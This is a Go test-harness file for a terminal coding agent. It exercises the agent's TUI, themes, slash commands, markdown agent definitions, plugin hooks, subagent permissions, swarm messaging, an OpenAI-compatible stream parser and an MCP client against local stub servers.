	work := filepath.Join(root, "tuiproj")
	_ = os.MkdirAll(filepath.Join(work, "src"), 0o755)
	_ = os.WriteFile(filepath.Join(work, "README.md"), []byte("# demo\n"), 0o644)
	_ = os.WriteFile(filepath.Join(work, "src", "main.go"), []byte("package main\n"), 0o644)

	loaded, _ := config.Load(work)
	themes := theme.Load()
	check("built-in themes load", len(themes.Names()) >= 3, fmt.Sprint(themes.Names()))
	check("default pickle-rick theme exists", themes.Get("pickle-rick") != nil)
	check("rick-black theme exists", themes.Get("rick-black") != nil)
	check("evil-rick theme exists", themes.Get("evil-rick") != nil)
	th := themes.Get("pickle-rick")
	check("theme resolves a defs reference to a hex colour",
		strings.HasPrefix(th.Color("primary").Dark, "#"), th.Color("primary").Dark)
	check("theme exposes diff roles", th.Color("diffAdded").Dark != th.Color("diffRemoved").Dark)

	todos := tools.NewTodoStore()
	reg := tools.NewRegistry()
	reg.Register(tools.ReadTool{})
	reg.Register(tools.BashTool{})
	reg.Register(tools.TodoWriteTool{Store: todos})

	store, _ := session.NewStore(filepath.Join(root, "tuisessions"))
	snaps, _ := session.NewSnapshotter(work, filepath.Join(root, "tuidata"))

	m := tui.New(tui.Deps{
		Loaded: loaded, Themes: themes, Registry: reg, Todos: todos,
		Perms: permission.New(loaded.Config.Permission, work),
		Store: store, Snapshots: snaps,
		Providers: map[string]provider.Provider{"anthropic": &stubProvider{}},
		Cwd:       work, Version: "vtest",
	})

	m = send(m, tea.WindowSizeMsg{Width: 120, Height: 40})
	view := m.View()
	check("first frame renders", len(view) > 100, fmt.Sprint(len(view)))
	// The splash is rendered by View while the conversation is empty, rather
	// than seeded into the transcript, so it assert against the view.
	check("splash shows the logo", strings.Contains(view, "___/"), "logo missing")
	check("splash shows the tagline", strings.Contains(view, "lightweight coding agent"))
	check("splash shows the version", strings.Contains(view, "vtest"))
	check("status bar shows the agent", strings.Contains(view, "build"), m.StatusLine())
	check("ANSI colour is emitted", strings.Contains(view, "\x1b["))
	// Regression: word-wrapping used to collapse runs of spaces, destroying
	// ASCII art and any indented/aligned content.
	m.PushSystem("  indented line\n  ██   ██")
	check("ASCII art keeps its internal spacing",
		strings.Contains(m.ChatContent(), "\u2588\u2588   \u2588\u2588"), "logo spacing collapsed")
	check("indented content is preserved verbatim",
		strings.Contains(m.ChatContent(), "  indented line"), "leading indent lost")

	// --- slash autocomplete ---
	m.InputSetValue("/")
	ac := m.RenderAutocomplete()
	check("bare / shows a command pill bar", strings.Contains(ac, "/help") && strings.Contains(ac, "/models"), ac)

	m.InputSetValue("/th")
	ac2 := m.RenderAutocomplete()
	check("/th filters to matching commands", strings.Contains(ac2, "/themes") || strings.Contains(ac2, "/thinking"), ac2)
	check("/th excludes non-matching commands", !strings.Contains(ac2, "/models"), ac2)

	m.InputSetValue("/zzzz")
	check("no-match autocomplete says so", strings.Contains(m.RenderAutocomplete(), "no matching"), m.RenderAutocomplete())

	// tab completion
	m.InputSetValue("/mod")
	m = key(m, "tab")
	check("tab completes a slash command", strings.HasPrefix(m.InputValue(), "/models"), m.InputValue())
	m.InputSetValue("")

	// --- commands ---
	m.InputSetValue("/help")
	m = key(m, "enter")
	// Commands render into the conversation now, not into an overlay.
	check("/help prints into the conversation", !m.ModalOpen(), "opened a modal")
	check("help leads with commands",
		strings.Contains(m.ChatContent(), "/models") && strings.Contains(m.ChatContent(), "/auth"),
		"commands missing")
	check("help still documents keys", strings.Contains(m.ChatContent(), "ctrl+c"), "keys missing")

	m.InputSetValue("/themes")
	m = key(m, "enter")
	check("/themes prints a numbered list", !m.ModalOpen() && m.PendingKind() != 0, "no pending choice")
	check("theme list names every theme", m.PendingCount() == len(themes.Names()),
		fmt.Sprint(m.PendingCount()))
	m.InputSetValue("rick-black") // answering by name also works
	m = key(m, "enter")
	check("selecting clears the pending choice", m.PendingKind() == 0)
	check("theme actually changed", m.ThemeName() == "rick-black", m.ThemeName())
	m.InputSetValue("/theme pickle-rick")
	m = key(m, "enter")
	check("/theme <name> switches directly", m.ThemeName() == "pickle-rick", m.ThemeName())

	m.InputSetValue("/models")
	m = key(m, "enter")
	check("/models prints a provider list", !m.ModalOpen() && m.PendingKind() != 0, "no pending choice")
	check("provider list is populated", m.PendingCount() >= 1, fmt.Sprint(m.PendingCount()))
	m.InputSetValue("")
	m = key(m, "enter") // empty input cancels the pending choice

	m.InputSetValue("/tools")
	m = key(m, "enter")
	check("/tools lists registered tools", strings.Contains(m.ChatContent(), "todowrite"), "tools missing")

	m.InputSetValue("/permissions")
	m = key(m, "enter")
	check("/permissions opens interactive menu", m.PendingKind() != 0, "no menu")

	m.InputSetValue("/config")
	m = key(m, "enter")
	check("/config prints the settings inline", !m.ModalOpen(), "opened a modal")
	check("/config shows the resolved config",
		strings.Contains(m.ChatContent(), "project root"), "config missing")

	m.InputSetValue("/nonsense")
	m = key(m, "enter")
	check("unknown command reports an error", strings.Contains(m.ChatContent(), "unknown command"), "no error shown")

	// --- agent toggle ---
	check("starts in build mode", m.AgentName() == "build")
	m.InputSetValue("")
	m = key(m, "tab")
	check("tab on empty input switches to plan", m.AgentName() == "plan", m.AgentName())
	check("plan mode is visible in the status line", strings.Contains(m.View(), "plan"))
	m = key(m, "tab")
	check("tab switches back to build", m.AgentName() == "build")

	// --- leader key ---
	m = key(m, "ctrl+x")
	check("leader key shows a hint", strings.Contains(m.View(), "leader"), m.StatusLine())
	m = key(m, "h")
	check("leader+h prints help inline", !m.ModalOpen() && strings.Contains(m.ChatContent(), "/models"))

	m = key(m, "ctrl+x")
	m = key(m, "t")
	check("leader+t prints the theme list inline", m.PendingKind() != 0, "no pending choice")
	m.InputSetValue("")
	m = key(m, "enter")

	// --- file picker ---
	m.InputSetValue("")
	m = typeStr(m, "look at @")
	check("@ opens the file picker", m.PickerActive())
	check("picker lists project files", m.PickerResults() > 0, fmt.Sprint(m.PickerResults()))
	before := m.PickerResults()
	m = typeStr(m, "main")
	check("typing filters the picker", m.PickerResults() <= before, fmt.Sprintf("%d -> %d", before, m.PickerResults()))
	m = key(m, "enter")
	check("selecting inserts the path", strings.Contains(m.InputValue(), "main.go"), m.InputValue())
	check("picker closes after selection", !m.PickerActive())
	m.InputSetValue("")

	m = typeStr(m, "@")
	check("picker reopens", m.PickerActive())
	m = key(m, "esc")
	check("esc dismisses the picker", !m.PickerActive())
	m.InputSetValue("")

	// --- input history ---
	m.InputSetValue("first message")
	m = key(m, "enter")
	m.InputSetValue("second message")
	m = key(m, "enter")
	m.InputSetValue("")
	m = key(m, "alt+up")
	check("up recalls the last input", m.InputValue() == "second message", m.InputValue())
	m = key(m, "alt+up")
	check("up again recalls the earlier input", m.InputValue() == "first message", m.InputValue())
	m = key(m, "alt+down")
	check("down moves forward again", m.InputValue() == "second message", m.InputValue())
	m.InputSetValue("")
	// Those two submissions started stub agent runs; interrupt so later
	// submissions are not rejected with "still working".
	m = key(m, "esc")
	check("esc interrupts an in-flight run", !strings.Contains(m.StatusLine(), "working"), m.StatusLine())

	// --- todo panel ---
	todos.Set([]tools.TodoItem{
		{ID: "1", Content: "explore the codebase", Status: "completed"},
		{ID: "2", Content: "write the patch", Status: "in_progress"},
		{ID: "3", Content: "run the tests", Status: "pending"},
	})
	m = send(m, tui.TodosChanged(todos.Items()).(tea.Msg))
	v := m.View()
	check("todo panel shows progress", strings.Contains(v, "tasks 1/3"), "no task counter")
	check("todo panel lists in-progress work", strings.Contains(v, "write the patch"))
	todos.Clear()

	// --- shell escape ---
	m.InputSetValue("!echo shell-escape-works")
	m = key(m, "enter")
	check("! creates a shell tool entry", strings.Contains(m.ChatContent(), "echo shell-escape-works"), "no entry")

	// --- diff rendering ---
	styles := tui.NewStyles(themes.Get("pickle-rick"))
	oldT := "alpha\nbeta\ngamma\n"
	newT := "alpha\nBETA\ngamma\ndelta\n"
	wide := styles.RenderDiff("f.go", oldT, newT, 160, "auto", 120, false)
	check("wide terminal renders a split diff", strings.Contains(wide, "│"), wide)
	narrow := styles.RenderDiff("f.go", oldT, newT, 60, "auto", 120, false)
	check("narrow terminal renders a stacked diff", !strings.Contains(narrow, " │ "), narrow)
	check("diff header shows the stat", strings.Contains(wide, "+2") && strings.Contains(wide, "-1"), wide)
	forced := styles.RenderDiff("f.go", oldT, newT, 200, "stacked", 120, false)
	check("stacked mode overrides width", !strings.Contains(forced, " │ "))

	// --- /new clears state (run LAST: it wipes the banner) ---
	m.InputSetValue("/new")
	m = key(m, "enter")
	check("/new clears the transcript back to the splash",
		m.ChatContent() == "" && strings.Contains(m.View(), "lightweight coding agent") &&
			!strings.Contains(m.View(), "shell-escape-works"),
		"state not cleared")

	// --- resize resilience ---
	for _, w := range []int{40, 60, 100, 200} {
		m = send(m, tea.WindowSizeMsg{Width: w, Height: 30})
		if len(m.View()) == 0 {
			check(fmt.Sprintf("renders at width %d", w), false)
			return
		}
	}
	check("renders correctly at every tested width", true)

	m = send(m, tea.WindowSizeMsg{Width: 120, Height: 40})
	check("final frame still renders", len(m.View()) > 100)
}

// ---------- markdown agents ----------

func testMarkdownAgents(root string) {
	section("markdown agents & commands")

	dir := filepath.Join(root, "mdagents", ".rick", "agents")
	_ = os.MkdirAll(dir, 0o755)
	_ = os.WriteFile(filepath.Join(dir, "reviewer.md"), []byte(`---
description: Reviews code for bugs
mode: subagent
model: anthropic/claude-haiku-4-5
temperature: 0.2
tools:
  write: false
  edit: false
  read: true
permission:
  bash: ask
---
You are a meticulous code reviewer. Report only real defects.
`), 0o644)

	agents := config.LoadMarkdownAgents(dir)
	a, ok := agents["reviewer"]
	check("markdown agent file is discovered", ok)
	if !ok {
		return
	}
	check("frontmatter description parsed", a.Description == "Reviews code for bugs", a.Description)
	check("frontmatter mode parsed", a.Mode == "subagent", a.Mode)
	check("frontmatter model parsed", a.Model == "anthropic/claude-haiku-4-5", a.Model)
	check("frontmatter temperature parsed", a.Temperature != nil && *a.Temperature == 0.2)
	check("nested tools block parsed", a.Tools != nil && !a.Tools["write"] && a.Tools["read"],
		fmt.Sprint(a.Tools))
	check("nested permission block parsed",
		a.Permission != nil && a.Permission.Bash["*"] == "ask", fmt.Sprint(a.Permission))
	check("body becomes the prompt",
		strings.HasPrefix(a.Prompt, "You are a meticulous code reviewer"), a.Prompt)
	check("frontmatter is stripped from the prompt", !strings.Contains(a.Prompt, "description:"))

	// Commands
	cdir := filepath.Join(root, "mdagents", ".rick", "commands")
	_ = os.MkdirAll(cdir, 0o755)
	_ = os.WriteFile(filepath.Join(cdir, "changelog.md"), []byte(`---
description: Write a changelog entry
---
Write a changelog entry for: $ARGUMENTS
`), 0o644)
	cmds := config.LoadMarkdownCommands(cdir)
	c, ok := cmds["changelog"]
	check("markdown command is discovered", ok)
	if ok {
		check("command description parsed", c.Description == "Write a changelog entry", c.Description)
		check("command template holds $ARGUMENTS", strings.Contains(c.Template, "$ARGUMENTS"), c.Template)
	}

	// No-frontmatter file must still work.
	plain := config.ParseAgentMarkdown("Just a prompt with no frontmatter.")
	check("file without frontmatter becomes a bare prompt",
		plain.Prompt == "Just a prompt with no frontmatter.", plain.Prompt)
}

// ---------- plugins ----------

func testPlugins(root string) {
	section("plugin hooks")

	tmp := filepath.Join(root, "plugtest")
	_ = os.MkdirAll(tmp, 0o755)
	_ = os.WriteFile(filepath.Join(tmp, "t.txt"), []byte("data\n"), 0o644)
	tools.ResetFileState()

	reg := tools.NewRegistry()
	reg.Register(tools.ReadTool{})
	reg.Register(tools.BashTool{})

	plugs := plugin.NewRegistry()
	var beforeCalls, afterCalls int
	plugs.Register(plugin.Hooks{
		Name: "observer",
		ToolExecuteBefore: func(ctx context.Context, ev *plugin.ToolBeforeEvent) error {
			beforeCalls++
			return nil
		},
		ToolExecuteAfter: func(ctx context.Context, ev *plugin.ToolAfterEvent) error {
			afterCalls++
			ev.Output = "[decorated] " + ev.Output
			return nil
		},
	})
	plugs.Register(plugin.Hooks{
		Name: "blocker",
		ToolExecuteBefore: func(ctx context.Context, ev *plugin.ToolBeforeEvent) error {
			if ev.Tool == "bash" {
				ev.Skip = true
				ev.Reason = "bash is disabled by the blocker plugin"
			}
			return nil
		},
	})
	check("plugin registry counts plugins", plugs.Len() == 2, fmt.Sprint(plugs.Len()))
	check("plugin names are listed", len(plugs.Names()) == 2)

	cfg, _ := config.Defaults()
	allow := *cfg.Permission
	allow.Read = "allow"
	allow.Bash = map[string]string{"*": "allow"}

	stub := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "p1", Name: "read", Input: json.RawMessage(`{"path":"t.txt"}`)}},
			{Kind: provider.EventDone},
		},
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "p2", Name: "bash", Input: json.RawMessage(`{"command":"echo nope"}`)}},
			{Kind: provider.EventDone},
		},
		{{Kind: provider.EventText, Text: "finished"}, {Kind: provider.EventDone}},
	}}

	runner := agent.New(agent.Config{
		Provider: stub, Model: "s", Tools: reg,
		Perms: permission.New(&allow, tmp), Cwd: tmp, Plugins: plugs,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision { return agent.DecideAccept },
	})
	ch := make(chan agent.Event, 256)
	var events []*agent.ToolEvent
	done := make(chan struct{})
	go func() {
		for ev := range ch {
			if ev.Kind == agent.EvToolEnd {
				events = append(events, ev.Tool)
			}
		}
		close(done)
	}()
	_, err := runner.Run(context.Background(), []provider.Message{provider.UserText("go")}, ch)
	<-done

	check("run with plugins completes", err == nil, fmt.Sprint(err))
	check("tool.execute.before fired for both tools", beforeCalls == 2, fmt.Sprint(beforeCalls))
	check("tool.execute.after fired only for the allowed tool", afterCalls == 1, fmt.Sprint(afterCalls))
	if len(events) >= 1 {
		check("after-hook rewrote the output",
			strings.HasPrefix(events[0].Output, "[decorated]"), events[0].Output)
	}
	if len(events) >= 2 {
		check("before-hook blocked bash",
			events[1].IsError && strings.Contains(events[1].Output, "blocker plugin"), events[1].Output)
	} else {
		check("before-hook blocked bash", false, "missing second tool event")
	}

	// session hooks
	idle, serr := 0, 0
	plugs2 := plugin.NewRegistry()
	plugs2.Register(plugin.Hooks{
		Name:         "sess",
		SessionIdle:  func(ctx context.Context, ev *plugin.SessionEvent) error { idle++; return nil },
		SessionError: func(ctx context.Context, ev *plugin.SessionEvent) error { serr++; return nil },
	})
	plugs2.DispatchSessionIdle(context.Background(), &plugin.SessionEvent{SessionID: "x"})
	plugs2.DispatchSessionError(context.Background(), &plugin.SessionEvent{SessionID: "x"})
	check("session.idle hook fires", idle == 1)
	check("session.error hook fires", serr == 1)
}

// ---------- subagents ----------

func testSubagents(root string) {
	section("subagents & task tool")

	specs := agent.BuiltinSubagents()
	check("general subagent exists", specs[agent.SubagentGeneral].Name == "general")
	check("explore subagent exists", specs[agent.SubagentExplore].Name == "explore")
	check("explore subagent is read-only", specs[agent.SubagentExplore].ReadOnly)
	check("general subagent is not read-only", !specs[agent.SubagentGeneral].ReadOnly)

	// tool filter
	exploreFilter := agent.SubagentToolFilter(specs[agent.SubagentExplore], nil)
	check("explore cannot write", !exploreFilter("write"))
	check("explore cannot edit", !exploreFilter("edit"))
	check("explore cannot run bash", !exploreFilter("bash"))
	check("explore can read", exploreFilter("read"))
	check("explore can grep", exploreFilter("grep"))
	check("no subagent can delegate further", !exploreFilter("task"))

	generalFilter := agent.SubagentToolFilter(specs[agent.SubagentGeneral], nil)
	check("general can write", generalFilter("write"))
	check("general cannot delegate further", !generalFilter("task"))

	// permissions
	cfg, _ := config.Defaults()
	base := permission.New(cfg.Permission, "/p")
	tightened := agent.SubagentPermissions(specs[agent.SubagentExplore], base, "/p")
	check("explore permissions deny edit",
		tightened.Check(permission.Request{Tool: "edit", Path: "/p/a"}) == permission.Deny)
	check("explore permissions deny bash",
		tightened.Check(permission.Request{Tool: "bash", Command: "ls"}) == permission.Deny)
	unchanged := agent.SubagentPermissions(specs[agent.SubagentGeneral], base, "/p")
	check("general permissions are untouched", unchanged == base)

	// task tool depth cap
	spawned := 0
	tt := agent.TaskTool{
		Specs: specs, MaxDepth: 1,
		Spawn: func(ctx context.Context, kind, desc, prompt string, depth int) (string, error) {
			spawned++
			return fmt.Sprintf("subagent %s ran at depth %d and found 3 files", kind, depth), nil
		},
	}
	check("task tool is named task", tt.Name() == "task")
	check("task description lists both subagents",
		strings.Contains(tt.Description(), "general") && strings.Contains(tt.Description(), "explore"))
	sch := tt.Schema()
	req, _ := sch["required"].([]string)
	check("task schema requires the three fields", len(req) == 3, fmt.Sprint(req))

	res, _ := tt.Run(context.Background(), tools.Context{Depth: 0},
		json.RawMessage(`{"subagent_type":"explore","description":"find handlers","prompt":"locate all HTTP handlers"}`))
	check("task tool spawns a subagent at depth 0", !res.IsError && spawned == 1, res.Output)
	check("task tool returns the subagent report",
		strings.Contains(res.Output, "found 3 files"), res.Output)
	check("task tool title names the work",
		strings.Contains(res.Title, "find handlers"), res.Title)

	resDeep, _ := tt.Run(context.Background(), tools.Context{Depth: 1},
		json.RawMessage(`{"subagent_type":"explore","description":"x","prompt":"y"}`))
	check("task tool enforces the depth cap", resDeep.IsError && spawned == 1, resDeep.Output)
	check("depth error explains the limit",
		strings.Contains(resDeep.Output, "depth limit"), resDeep.Output)

	resBad, _ := tt.Run(context.Background(), tools.Context{Depth: 0},
		json.RawMessage(`{"subagent_type":"nonexistent","description":"x","prompt":"y"}`))
	check("unknown subagent type is rejected", resBad.IsError, resBad.Output)

	// RunSubagent end-to-end with a stub provider
	tmp := filepath.Join(root, "subagent")
	_ = os.MkdirAll(tmp, 0o755)
	_ = os.WriteFile(filepath.Join(tmp, "hit.txt"), []byte("needle\n"), 0o644)
	tools.ResetFileState()

	reg := tools.NewRegistry()
	reg.Register(tools.ReadTool{})
	reg.Register(tools.GlobTool{})

	stub := &stubProvider{turns: [][]provider.Event{
		{
			{Kind: provider.EventToolCall, ToolCall: &provider.ToolCall{
				ID: "s1", Name: "glob", Input: json.RawMessage(`{"pattern":"*.txt"}`)}},
			{Kind: provider.EventDone},
		},
		{
			{Kind: provider.EventText, Text: "Found hit.txt containing the needle."},
			{Kind: provider.EventDone},
		},
	}}
	allow := *cfg.Permission
	allow.Read = "allow"
	out, err := agent.RunSubagent(context.Background(), agent.Config{
		Provider: stub, Model: "s", Tools: reg,
		Perms: permission.New(&allow, tmp), Cwd: tmp, Depth: 1,
		Ask: func(context.Context, permission.Request) agent.PermissionDecision { return agent.DecideAccept },
	}, "find the needle", nil)
	check("RunSubagent completes", err == nil, fmt.Sprint(err))
	check("RunSubagent returns only the final report",
		out == "Found hit.txt containing the needle.", fmt.Sprintf("%q", out))
}

// ---------- swarms ----------

func testSwarms(root string) {
	section("swarm system")

	// Board operations
	b := swarm.NewBoard()
	b.Put("key1", "value1", "agent1")
	entry, err := b.Get("key1")
	check("board Get returns entry", err == nil && entry.Value == "value1", fmt.Sprint(entry))
	check("board Has finds key", b.Has("key1"), "expected true")
	check("board Has misses unknown", !b.Has("nope"), "expected false")
	check("board Len counts entries", b.Len() == 1, fmt.Sprint(b.Len()))
	b.Put("key2", "value2", "agent2")
	check("board List sorts by key", len(b.List()) == 2, fmt.Sprint(len(b.List())))

	// Message routing
	s := swarm.NewSwarm("test-1", "test-swarm", "do work", swarm.TopologyMesh)
	s.AddAgent("alice", "researcher")
	s.AddAgent("bob", "coder")

	// Direct message
	msg := swarm.NewMessage("alice", "bob", swarm.MsgTask, "find the code")
	err = s.Message(msg)
	check("message routes to agent", err == nil, fmt.Sprint(err))

	bob, _ := s.GetAgent("bob")
	check("message delivered to inbox", len(bob.GetMessages()) > 0, "no messages")

	// Broadcast
	bcast := swarm.NewMessage("alice", "*", swarm.MsgBroadcast, "hello all")
	err = s.Message(bcast)
	check("broadcast routes to all", err == nil, fmt.Sprint(err))

	alice, _ := s.GetAgent("alice")
	check("broadcast excludes sender", len(alice.GetMessages()) == 0, "should be 0")

	// Completion tracking
	check("IsDone false when idle", !s.IsDone(), "should be false")
	s.Agents["alice"].SetStatus(swarm.StatusDone)
	s.Agents["bob"].SetStatus(swarm.StatusDone)
	check("IsDone true when all done", s.IsDone(), "should be true")

	completion := s.Completion()
	check("Completion tracks done count", completion[swarm.StatusDone] == 2, fmt.Sprint(completion))

	// Report generation
	report := s.Report()
	check("Report contains swarm name", strings.Contains(report, "test-swarm"), "missing name")
	check("Report contains agent names", strings.Contains(report, "alice") && strings.Contains(report, "bob"), "missing agents")

	// Swarm manager
	mgr := swarm.NewSwarmManager()
	mgr.Add(s)
	check("manager lists swarms", len(mgr.List()) == 1, fmt.Sprint(len(mgr.List())))

	got, err := mgr.Get("test-1")
	check("manager Get returns swarm", err == nil && got.Name == "test-swarm", fmt.Sprint(err))

	// Kill
	err = mgr.Kill("test-1")
	check("kill terminates swarm", err == nil, fmt.Sprint(err))

	// SwarmRegistry
	baseReg := tools.NewRegistry()
	baseReg.Register(tools.ReadTool{})
	sr := tools.NewSwarmRegistry(baseReg)
	_, hasBase := sr.Get("read")
	check("SwarmRegistry inherits base tools", hasBase, "missing read tool")

	msgTool := agent.MessageTool{Send: func(m swarm.Message) error { return nil }}
	sr.Register(msgTool)
	_, hasMsg := sr.Get("message")
	check("SwarmRegistry adds swarm tools", hasMsg, "missing message tool")

	names := sr.Names()
	check("SwarmRegistry lists all tools", len(names) > 1, fmt.Sprint(names))
}

// ---------- openai wire format ----------

func testOpenAIWire() {
	section("openai-compatible provider")

	c := openai.New("openai", "sk-x", "")
	check("openai default base url", strings.Contains(c.BaseURL, "api.openai.com"), c.BaseURL)
	check("openai advertises models", len(c.Models()) > 0)

	or := openai.New("openrouter", "sk-y", "")
	check("openrouter default base url", strings.Contains(or.BaseURL, "openrouter.ai"), or.BaseURL)
	check("openrouter sets attribution headers", or.Headers["X-Title"] == "rick")

	custom := openai.New("mygateway", "k", "http://localhost:4000/v1/")
	check("custom base url is trimmed", custom.BaseURL == "http://localhost:4000/v1", custom.BaseURL)

	// Verify the SSE reader through a live local HTTP server.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body map[string]any
		_ = json.NewDecoder(r.Body).Decode(&body)
		msgs, _ := body["messages"].([]any)
		toolsArr, _ := body["tools"].([]any)

		w.Header().Set("Content-Type", "text/event-stream")
		fl, _ := w.(http.Flusher)
		lines := []string{
			`data: {"choices":[{"delta":{"content":"Hello "}}]}`,
			`data: {"choices":[{"delta":{"content":"world"}}]}`,
			`data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"tc1","function":{"name":"read","arguments":"{\"path\":"}}]}}]}`,
			`data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"\"x.go\"}"}}]}}]}`,
			`data: {"choices":[{"delta":{},"finish_reason":"tool_calls"}],"usage":{"prompt_tokens":11,"completion_tokens":7}}`,
			`data: [DONE]`,
		}
		for _, l := range lines {
			fmt.Fprintf(w, "%s\n\n", l)
			if fl != nil {
				fl.Flush()
			}
		}
		_ = msgs
		_ = toolsArr
	}))
	defer srv.Close()

	cl := openai.New("test", "k", srv.URL)
	ch := make(chan provider.Event, 64)
	go cl.Stream(context.Background(), provider.Request{
		Model:  "m",
		System: "be terse",
		Messages: []provider.Message{
			provider.UserText("hi"),
			{Role: provider.RoleAssistant, Content: []provider.ContentBlock{
				{Type: "tool_use", ID: "old", Name: "read", Input: json.RawMessage(`{"path":"a"}`)}}},
			{Role: provider.RoleUser, Content: []provider.ContentBlock{
				provider.ToolResultBlock("old", "content", false)}},
		},
		Tools: []provider.ToolSchema{{Name: "read", Description: "d",
			InputSchema: map[string]any{"type": "object"}}},
	}, ch)

	var text strings.Builder
	var calls []provider.ToolCall
	var usage *provider.Usage
	var streamErr error
	closed := false
	for ev := range ch {
		switch ev.Kind {
		case provider.EventText:
			text.WriteString(ev.Text)
		case provider.EventToolCall:
			calls = append(calls, *ev.ToolCall)
		case provider.EventUsage:
			usage = ev.Usage
		case provider.EventError:
			streamErr = ev.Err
		case provider.EventDone:
			closed = true
		}
	}
	check("openai stream has no error", streamErr == nil, fmt.Sprint(streamErr))
	check("openai stream accumulates text", text.String() == "Hello world", text.String())
	check("openai stream emits a done event", closed)
	check("openai stream parses one tool call", len(calls) == 1, fmt.Sprint(len(calls)))
	if len(calls) == 1 {
		check("tool call name is correct", calls[0].Name == "read", calls[0].Name)
		check("split partial JSON arguments are reassembled",
			string(calls[0].Input) == `{"path":"x.go"}`, string(calls[0].Input))
	}
	check("usage is reported",
		usage != nil && usage.InputTokens == 11 && usage.OutputTokens == 7, fmt.Sprintf("%+v", usage))
	check("channel was closed exactly once (no panic)", true)
}

// ---------- mcp ----------

func testMCP(root string) {
	section("MCP client")

	mgr := mcp.NewManager()
	check("manager starts empty", len(mgr.ServerNames()) == 0)

	// A server that fails to start must be recorded, not fatal.
	mgr.Connect(context.Background(), map[string]config.MCPServer{
		"broken": {Type: "local", Command: []string{"definitely-not-a-real-binary-xyz"}},
	})
	check("failed server is recorded as an error", len(mgr.Errors()) == 1, fmt.Sprint(mgr.Errors()))
	check("failed server is not listed as connected", len(mgr.ServerNames()) == 0)

	// Disabled servers are skipped entirely.
	no := false
	mgr2 := mcp.NewManager()
	mgr2.Connect(context.Background(), map[string]config.MCPServer{
		"off": {Type: "local", Command: []string{"whatever"}, Enabled: &no},
	})
	check("disabled server is skipped", len(mgr2.Errors()) == 0 && len(mgr2.ServerNames()) == 0)

	// Remote transport against a stub JSON-RPC server.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			ID     int64  `json:"id"`
			Method string `json:"method"`
			Params struct {
				Name      string         `json:"name"`
				Arguments map[string]any `json:"arguments"`
			} `json:"params"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		w.Header().Set("Content-Type", "application/json")

		switch req.Method {
		case "initialize":
			fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"result":{"protocolVersion":"2024-11-05","serverInfo":{"name":"stub"}}}`, req.ID)
		case "tools/list":
			fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"result":{"tools":[
				{"name":"search","description":"Search the docs","inputSchema":{"type":"object","properties":{"q":{"type":"string"}}}},
				{"name":"fetch-page","description":"Fetch a page","inputSchema":{"type":"object"}}
			]}}`, req.ID)
		case "tools/call":
			q, _ := req.Params.Arguments["q"].(string)
			fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"result":{"content":[{"type":"text","text":"results for %s"}],"isError":false}}`, req.ID, q)
		default:
			fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"error":{"code":-32601,"message":"no such method"}}`, req.ID)
		}
	}))
	defer srv.Close()

	mgr3 := mcp.NewManager()
	mgr3.Connect(context.Background(), map[string]config.MCPServer{
		"docs": {Type: "remote", URL: srv.URL, Headers: map[string]string{"Authorization": "Bearer x"}},
	})
	check("remote MCP server connects", len(mgr3.ServerNames()) == 1, fmt.Sprint(mgr3.Errors()))

	reg := tools.NewRegistry()
	n := mgr3.Register(reg, nil)
	check("MCP tools are registered", n == 2, fmt.Sprint(n))
	names := reg.Names()
	check("MCP tools get a server prefix", contains(names, "docs_search"), fmt.Sprint(names))
	check("illegal characters in tool names are sanitised",
		contains(names, "docs_fetch-page"), fmt.Sprint(names))

	tool, ok := reg.Get("docs_search")
	check("registered MCP tool is retrievable", ok)
	if ok {
		check("MCP tool exposes the server description",
			tool.Description() == "Search the docs", tool.Description())
		check("MCP tool exposes the server schema", tool.Schema()["type"] == "object")
		check("MCP tools are treated as mutating", !tool.ReadOnly())

		res, _ := tool.Run(context.Background(), tools.Context{}, json.RawMessage(`{"q":"golang"}`))
		check("MCP tool call round-trips",
			!res.IsError && strings.Contains(res.Output, "results for golang"), res.Output)
	}

	// Glob-based enable/disable.
	reg2 := tools.NewRegistry()
	n2 := mgr3.Register(reg2, map[string]bool{"docs_*": false})
	check("glob disable removes MCP tools", n2 == 0, fmt.Sprint(n2))

	reg3 := tools.NewRegistry()
	n3 := mgr3.Register(reg3, map[string]bool{"docs_fetch-page": false})
	check("exact disable removes one MCP tool", n3 == 1, fmt.Sprint(n3))

	mgr3.Close()
	check("manager closes cleanly", len(mgr3.ServerNames()) == 0)
}

func contains(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}
